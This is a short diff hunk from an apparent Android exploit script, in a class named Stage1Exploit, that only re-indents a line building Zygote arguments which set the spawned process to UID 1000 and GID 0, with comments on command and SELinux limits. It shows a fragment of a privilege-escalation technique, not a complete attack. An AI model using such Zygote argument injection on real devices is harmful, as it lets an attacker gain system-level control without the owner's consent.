@@ -188,7 +188,7 @@ class Stage1Exploit:
         # commas don't work because they're treated as a separator
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
-       raw_zygote_arguments = [
+        raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=0",
             "--setgroups=1002",
